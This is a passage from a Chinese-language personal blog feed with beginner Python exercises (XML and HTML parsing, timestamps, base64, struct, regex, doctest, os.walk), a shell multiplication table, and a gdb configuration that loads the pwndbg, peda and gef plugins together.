       &lt;yweather:forecast day="Wed" date="27 May 2015" low="20" high="33" text="Partly Cloudy" code="30" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Thu" date="28 May 2015" low="21" high="34" text="Sunny" code="32" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Fri" date="29 May 2015" low="18" high="25" text="AM Showers" code="39" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Sat" date="30 May 2015" low="18" high="32" text="Sunny" code="32" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Sun" date="31 May 2015" low="20" high="37" text="Sunny" code="32" /&gt;</span></span><br><span class="line"><span class="string">        &lt;/item&gt;</span></span><br><span class="line"><span class="string">    &lt;/channel&gt;</span></span><br><span class="line"><span class="string">&lt;/rss&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">weather_dict=&#123;&#125;</span><br><span class="line">day = <span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WeatherSaxHandler</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_element</span><span class="params">(self, name, attrs)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> weather_dict,day</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">'yweather:location'</span>:</span><br><span class="line">            weather_dict[<span class="string">'city'</span>] = attrs[<span class="string">'city'</span>]</span><br><span class="line">            weather_dict[<span class="string">'country'</span>] = attrs[<span class="string">'country'</span>]</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">'yweather:forecast'</span>:</span><br><span class="line">            day = day + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> day == <span class="number">1</span> :</span><br><span class="line">                weather_dict[<span class="string">'today'</span>]=&#123;<span class="string">'text'</span>:attrs[<span class="string">'text'</span>], <span class="string">'low'</span>:int(attrs[<span class="string">'low'</span>]), <span class="string">'high'</span>:int(attrs[<span class="string">'high'</span>])&#125;</span><br><span class="line">            <span class="keyword">if</span> day == <span class="number">2</span> :</span><br><span class="line">                weather_dict[<span class="string">'tomorrow'</span>]=&#123;<span class="string">'text'</span>:attrs[<span class="string">'text'</span>], <span class="string">'low'</span>:int(attrs[<span class="string">'low'</span>]), <span class="string">'high'</span>:int(attrs[<span class="string">'high'</span>])&#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">end_element</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">char_data</span><span class="params">(self, text)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_weather</span><span class="params">(xml)</span>:</span></span><br><span class="line">    handler = WeatherSaxHandler()</span><br><span class="line">    parser = ParserCreate()</span><br><span class="line">    parser.StartElementHandler = handler.start_element</span><br><span class="line">    parser.CharacterDataHandler = handler.char_data</span><br><span class="line">    parser.EndElementHandler = handler.end_element</span><br><span class="line">    parser.Parse(xml)</span><br><span class="line">    <span class="keyword">return</span> weather_dict</span><br><span class="line"></span><br><span class="line">weather = parse_weather(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'city'</span>] == <span class="string">'Beijing'</span>, weather[<span class="string">'city'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'country'</span>] == <span class="string">'China'</span>, weather[<span class="string">'country'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'today'</span>][<span class="string">'text'</span>] == <span class="string">'Partly Cloudy'</span>,weather[<span class="string">'today'</span>][<span class="string">'text'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'today'</span>][<span class="string">'low'</span>] == <span class="number">20</span>, weather[<span class="string">'today'</span>][<span class="string">'low'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'today'</span>][<span class="string">'high'</span>] == <span class="number">33</span>, weather[<span class="string">'today'</span>][<span class="string">'high'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'tomorrow'</span>][<span class="string">'text'</span>] == <span class="string">'Sunny'</span>,weather[<span class="string">'tomorrow'</span>][<span class="string">'text'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'tomorrow'</span>][<span class="string">'low'</span>] == <span class="number">21</span>, weather[<span class="string">'tomorrow'</span>][<span class="string">'low'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> weather[<span class="string">'tomorrow'</span>][<span class="string">'high'</span>] == <span class="number">34</span>, weather[<span class="string">'tomorrow'</span>][<span class="string">'high'</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Weather:'</span>, str(weather))</span><br></pre></td></tr></table></figure><h2 id="html解析"><a href="#html解析" class="headerlink" title="html解析"></a>html解析</h2><p><strong>找一个网页，例如 <span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9ldmVudHMvcHl0aG9uLWV2ZW50cy/vvIznlKjmtY/op4jlmajmn6XnnIvmupDnoIHlubblpI3liLbvvIznhLblkI7lsJ3or5Xop6PmnpDkuIDkuIs=" title="https://www.python.org/events/python-events/，用浏览器查看源码并复制，然后尝试解析一下">https://www.python.org/events/python-events/，用浏览器查看源码并复制，然后尝试解析一下<i class="fa fa-external-link"></i></span> HTML，输出 Python 官网发布的会议时间、名称和地点</strong></p><ul><li>代码抄别人的，不过懂了，自己打了一遍<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> html.parser <span class="keyword">import</span> HTMLParser</span><br><span class="line"><span class="keyword">from</span> html.entities <span class="keyword">import</span> name2codepoint</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHTMLParser</span><span class="params">(HTMLParser)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        HTMLParser.__init__(self)</span><br><span class="line">        self.is_time = <span class="literal">False</span></span><br><span class="line">        self.is_title = <span class="literal">False</span></span><br><span class="line">        self.is_year = <span class="literal">False</span></span><br><span class="line">        self.is_location = <span class="literal">False</span></span><br><span class="line">        self.info = []</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_starttag</span><span class="params">(self, tag, attrs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'time'</span>:</span><br><span class="line">            self.is_time = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'h3'</span> <span class="keyword">and</span> (<span class="string">'class'</span>, <span class="string">'event-title'</span>) <span class="keyword">in</span> attrs:</span><br><span class="line">            self.is_title = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'span'</span> <span class="keyword">and</span> (<span class="string">'class'</span>, <span class="string">'event-location'</span>) <span class="keyword">in</span> attrs:</span><br><span class="line">            self.is_location = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> tag == <span class="string">'span'</span> <span class="keyword">and</span> (<span class="string">'class'</span>, <span class="string">'say-no-more'</span>) <span class="keyword">in</span> attrs:</span><br><span class="line">            self.is_year = <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_data</span><span class="params">(self,data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.is_time:</span><br><span class="line">            self.is_time = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'time'</span>:data&#125;</span><br><span class="line">            self.info.append(mydict)</span><br><span class="line">        <span class="keyword">if</span> self.is_title:</span><br><span class="line">            self.is_title = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'title'</span>:data&#125;</span><br><span class="line">            self.info.append(mydict)</span><br><span class="line">        <span class="keyword">if</span> self.is_location:</span><br><span class="line">            self.is_location = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'location'</span>:data&#125;</span><br><span class="line">            self.info.append(mydict)</span><br><span class="line">        <span class="keyword">if</span> self.is_year:</span><br><span class="line">            self.is_year = <span class="literal">False</span></span><br><span class="line">            mydict = &#123;<span class="string">'date'</span>:data&#125;</span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">r'[0-9]'</span>,data.strip()):</span><br><span class="line">                self.info.append(mydict)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getinfo</span><span class="params">(data)</span>:</span></span><br><span class="line">    parser = MyHTMLParser()</span><br><span class="line">    parser.feed(data)</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> parser.info:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> x:</span><br><span class="line">            print(key + <span class="string">':'</span> + str(x[key]))</span><br><span class="line">        count = count + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">'--------------------------------'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.html'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    htmlcont = f.read()</span><br><span class="line">    getinfo(htmlcont)</span><br></pre></td></tr></table></figure></li></ul><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/b164eb0e/">https://noone-hub.github.io/posts/b164eb0e/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第六天学习</title>
    <url>/posts/98ab9219/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="时间库练习"><a href="#时间库练习" class="headerlink" title="时间库练习"></a>时间库练习</h2><p><strong>假设你获取了用户输入的日期和时间如 2015-1-21 9:01:30，以及一个时区信息如UTC+5:00，均是 str，请编写一个函数将其转换为 timestamp：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timezone, timedelta</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_timestamp</span><span class="params">(dt_str, tz_str)</span>:</span></span><br><span class="line">----</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">----</span><br><span class="line"><span class="comment"># 测试:</span></span><br><span class="line">t1 = to_timestamp(<span class="string">'2015-6-1 08:10:30'</span>, <span class="string">'UTC+7:00'</span>)</span><br><span class="line"><span class="keyword">assert</span> t1 == <span class="number">1433121030.0</span>, t1</span><br><span class="line">t2 = to_timestamp(<span class="string">'2015-5-31 16:10:30'</span>, <span class="string">'UTC-09:00'</span>)</span><br><span class="line"><span class="keyword">assert</span> t2 == <span class="number">1433121030.0</span>, t2</span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>贴上我的代码，不难，不过我写的有点复杂了感觉</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime,timezone,timedelta</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_timestamp</span><span class="params">(info,where)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(info,str) <span class="keyword">or</span> <span class="keyword">not</span> isinstance(where,str): <span class="comment">#用户错误输入处理</span></span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"wrong input"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    now = datetime.strptime(info,<span class="string">"%Y-%m-%d %H:%M:%S"</span>) <span class="comment">#格式化时间</span></span><br><span class="line">    temp = re.match(<span class="string">r'^(UTC)([+-])([0-9]+):([0-9]+)'</span>,where).groups() <span class="comment">#正则匹配分割时间，应该有更简便的办法，我顺便练习下正则</span></span><br><span class="line">    temp = int(temp[<span class="number">1</span>]+temp[<span class="number">2</span>]) <span class="comment">#字符串转换成数字</span></span><br><span class="line">    now = now.replace(tzinfo=timezone(timedelta(hours=temp))) <span class="comment">#转换成带时区的时间</span></span><br><span class="line">    <span class="keyword">return</span> now.timestamp() <span class="comment">#转换成timestamp</span></span><br><span class="line"></span><br><span class="line">t1 = to_timestamp(<span class="string">'2015-6-1 08:10:30'</span>, <span class="string">'UTC+7:00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> t1 == <span class="number">1433121030.0</span>, t1</span><br><span class="line"></span><br><span class="line">t2 = to_timestamp(<span class="string">'2015-5-31 16:10:30'</span>, <span class="string">'UTC-09:00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> t2 == <span class="number">1433121030.0</span>, t2</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure><h2 id="处理base64无等号版编码"><a href="#处理base64无等号版编码" class="headerlink" title="处理base64无等号版编码"></a>处理base64无等号版编码</h2><p><strong>请写一个能处理去掉=的 base64 解码函数：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_base64_decode</span><span class="params">(s)</span>:</span></span><br><span class="line">----</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">----</span><br><span class="line"><span class="comment"># 测试:</span></span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA=='</span>),</span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA=='</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA'</span>),</span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA'</span>)</span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure><ul><li>题目不难。。然后我发觉题目给的测试是有误的，assert加逗号，后面那部分出错后是不会执行的，他的想法是对的，然而写法是错的</li><li>然后python3我代码没过，python2过了，具体细节待研究<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_base64_decode</span><span class="params">(s)</span>:</span></span><br><span class="line">    length = len(s)</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> length%<span class="number">4</span> == <span class="number">0</span> :</span><br><span class="line">        result = base64.b64decode(s)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = base64.b64decode(str(s) + (length%<span class="number">4</span>)*<span class="string">'='</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA=='</span>)</span><br><span class="line"></span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA=='</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="string">b'abcd'</span> == safe_base64_decode(<span class="string">b'YWJjZA'</span>)</span><br><span class="line"></span><br><span class="line">safe_base64_decode(<span class="string">'YWJjZA'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="struct的使用"><a href="#struct的使用" class="headerlink" title="struct的使用"></a>struct的使用</h2><p><strong>练习：请编写一个 bmpinfo.py，可以检查任意文件是否是位图文件，如果是，打印出图片大小和颜色数。</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read(<span class="number">30</span>)</span><br><span class="line">    temp = struct.unpack(<span class="string">'&lt;ccIIIIIIHH'</span>,data)</span><br><span class="line">    <span class="keyword">if</span> temp[<span class="number">0</span>] == <span class="string">'B'</span> <span class="keyword">and</span> (temp[<span class="number">1</span>]==<span class="string">'M'</span> <span class="keyword">or</span> temp[<span class="number">1</span>]==<span class="string">'A'</span>):</span><br><span class="line">        print(<span class="string">'size :&#123;&#125;*&#123;&#125;,color:&#123;&#125;'</span>.format(temp[<span class="number">6</span>],temp[<span class="number">7</span>],temp[<span class="number">9</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">'wrong file'</span>)</span><br><span class="line"></span><br><span class="line">judge(<span class="string">'1.py'</span>)</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/98ab9219/">https://noone-hub.github.io/posts/98ab9219/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>shell-1</title>
    <url>/posts/b45040e8/</url>
    <content><![CDATA[<h1 id="shell脚本学习"><a href="#shell脚本学习" class="headerlink" title="shell脚本学习"></a>shell脚本学习</h1><h2 id="九九乘法表"><a href="#九九乘法表" class="headerlink" title="九九乘法表"></a>九九乘法表</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> `seq 9`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> `seq <span class="variable">$n</span>`</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">"<span class="variable">$m</span>*<span class="variable">$n</span>="</span>`expr <span class="variable">$m</span> \* <span class="variable">$n</span>`<span class="string">"   "</span>  </span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/b45040e8/">https://noone-hub.github.io/posts/b45040e8/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>shell脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第五天学习</title>
    <url>/posts/2c7ac85e/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="正则学习"><a href="#正则学习" class="headerlink" title="正则学习"></a>正则学习</h2><p><strong>练习题：请尝试写一个验证 Email 地址的正则表达式。版本一应该可以验证出类似的 Email：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.match(<span class="string">r'^([0-9a-zA-Z\_\.]+)@([0-9a-zA-Z\_]+).([a-zA-Z]+)'</span>,<span class="string">'bill.gates@microsoft.com'</span>).groups()</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p><strong>版本二可以验证并提取出带名字的 Email 地址：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.match(<span class="string">r'^(&lt;[a-zA-Z\s]+&gt;)\s([0-9a-zA-Z\_\.\&lt;\&gt;]+)@([0-9a-zA-Z\_]+).([a-zA-Z]+)'</span>,<span class="string">'&lt;Tom Paris&gt; tom@voyager.org'</span>).groups()</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/2c7ac85e/">https://noone-hub.github.io/posts/2c7ac85e/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>gdb_config</title>
    <url>/posts/f3251790/</url>
    <content><![CDATA[<p>在不久前，我很讨厌gdb这种调试器，在windows下熟悉了ollydbg的我，遇上了纯命令的gdb调试器很是费劲，所以我前段时间研究了下gdb的插件peda，pwndbg(专用于pwn)，gef这些个插件，网上你可以去找教程，那些教程都是说如何切换三个调试器，而我的重点是 <strong>三个插件如何一起使用</strong></p><h1 id="如何同时使用gef-pwndbg-peda三个插件？"><a href="#如何同时使用gef-pwndbg-peda三个插件？" class="headerlink" title="如何同时使用gef,pwndbg,peda三个插件？"></a>如何同时使用gef,pwndbg,peda三个插件？</h1><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>我研究了一番gdbinit的这份文件，有人说，这不就是几个source吗，有什么好研究的？确实如此，gdbinit里就是几个环境变量的配置，然而用不用的好就是另一回事了，经过我一番推敲，发觉这份配置是不会出错的配置，可以同时使用三个插件，下面先贴上gdbinit部分配置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.pwndbg/gdbinit.py</span><br><span class="line"><span class="built_in">source</span> ~/.peda/peda.py</span><br><span class="line"><span class="built_in">source</span> ~/.gdbinit-gef.py</span><br></pre></td></tr></table></figure><p>这个顺序不要调换，调换后会报错，具体pwndbg和peda和gef的安装，我就不教了，如果这个都不会，你装三个插件折腾个啥，一个插件就够你用了，有人看不懂这几句话，我也没办法，你照着改就好了。</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/f3251790/">https://noone-hub.github.io/posts/f3251790/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>环境</category>
      </categories>
      <tags>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第四天学习</title>
    <url>/posts/1c68fab/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="模块测试"><a href="#模块测试" class="headerlink" title="模块测试"></a>模块测试</h2><p>这部分没有例子，我也就没去写了，总的来说可以测试数据的合理性，没有通过模块测试一定有bug，不过你模块测试都写错了，那就没得说了</p><h2 id="文档测试"><a href="#文档测试" class="headerlink" title="文档测试"></a>文档测试</h2><p>练习：对函数 fact(n)编写 doctest 并执行：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fact</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">----</span></span><br><span class="line"><span class="string">----</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError()</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n * fact(n - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> doctest</span><br><span class="line">    doctest.testmod()</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><ul><li>上述为题目简介</li></ul><p>贴上代码，简单：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fact</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(1)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(2)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(3)</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(4)</span></span><br><span class="line"><span class="string">    24</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError()</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n * fact(n<span class="number">-1</span>)</span><br></pre></td></tr></table></figure><ul><li>文档测试可以用来做实例，还可以测试数据的正确性，不过不要跟我一样写有规律的测试，写一些随机取数测试</li></ul><h2 id="os输入输出流部分"><a href="#os输入输出流部分" class="headerlink" title="os输入输出流部分"></a>os输入输出流部分</h2><p>感觉跟c的读写文件都差不多，附上练习部分解答</p><ol><li>利用 os 模块编写一个能实现 dir -l 输出的程序**</li></ol><ul><li>dir -1就是将每个文件包括目录按每行一个列出来，不包括隐藏文件<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dir1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(<span class="string">'.'</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> f.startswith(<span class="string">'.'</span>):</span><br><span class="line">            <span class="keyword">print</span> f</span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li>编写一个程序，能在当前目录以及当前目录的所有子目录下查找文件名包含指定字符串的文件，并打印出相对路径。</li></ol><ul><li>这题也不难，说实话一开头还不会写，找了点参考文章后才会写</li></ul><p><strong>参考文章内容：</strong></p><ul><li><p>os.walk(path)遍历path，返回一个对象，</p></li><li><p>他的每个部分都是一个三元组(‘目录x’，[目录x下的目录list]，目录x下面的文件)</p></li><li><p>eg:for root ,dirs,files in os.walk(path): #os.walk返回的是一个三元组:根目录,文件列表，文件名</p></li><li><p>举例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = os.walk(<span class="string">'.'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line">输出：</span><br><span class="line">(<span class="string">'.'</span>, [<span class="string">'abc'</span>, <span class="string">'temp'</span>], [<span class="string">'path0704.py'</span>, <span class="string">'\xc2\xb7\xbe\xb6\xcf\xe0\xb9\xd8\xd1\xa7\xcf\xb0.txt'</span>])</span><br><span class="line">(<span class="string">'.\\abc'</span>, [], [<span class="string">'\xd0\xc2\xbd\xa8 BMP \xcd\xbc\xcf\xf1.bmp'</span>])</span><br><span class="line">(<span class="string">'.\\temp'</span>, [<span class="string">'temp1'</span>], [<span class="string">'temp.h'</span>])</span><br><span class="line">(<span class="string">'.\\temp\\temp1'</span>, [], [<span class="string">'abc.bmp'</span>])</span><br></pre></td></tr></table></figure></li><li><p><strong>下面贴上我的代码</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Findfile</span><span class="params">(name)</span>:</span></span><br><span class="line">    myos = os.walk(<span class="string">'.'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> myos:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i[<span class="number">2</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> == j.find(name):</span><br><span class="line">                <span class="keyword">print</span> i[<span class="number">0</span>] + j</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    Findfile(<span class="string">'1.py'</span>)</span><br></pre></td></tr></table></figure></li></ul><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/1c68fab/">https://noone-hub.github.io/posts/1c68fab/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第三天学习</title>
    <url>/posts/a6467bc7/</url>
